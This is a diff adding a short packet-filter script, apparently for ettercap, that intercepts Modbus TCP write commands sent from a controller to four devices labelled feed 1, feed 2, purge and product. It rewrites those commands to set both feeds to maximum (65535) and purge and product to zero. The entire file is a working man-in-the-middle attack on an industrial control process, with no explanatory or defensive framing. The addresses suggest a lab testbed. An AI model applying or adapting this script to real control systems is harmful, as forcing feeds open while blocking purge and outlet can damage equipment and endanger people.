@@ -1,0 +1,34 @@
+# manipulate feed 1  and feed 2 command to 65535
+# manipulate purge and product command to 0
+
+# feed 1
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.10') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0xff;
+        DATA.data + 14 = 0xff;
+    }
+}
+
+# feed 2
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.11') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0xff;
+        DATA.data + 14 = 0xff;
+    }
+}
+
+# purge
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.12') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0x00;
+        DATA.data + 14 = 0x00;
+    }
+}
+
+# product
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.13') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0x00;
+        DATA.data + 14 = 0x00;
+    }
+}
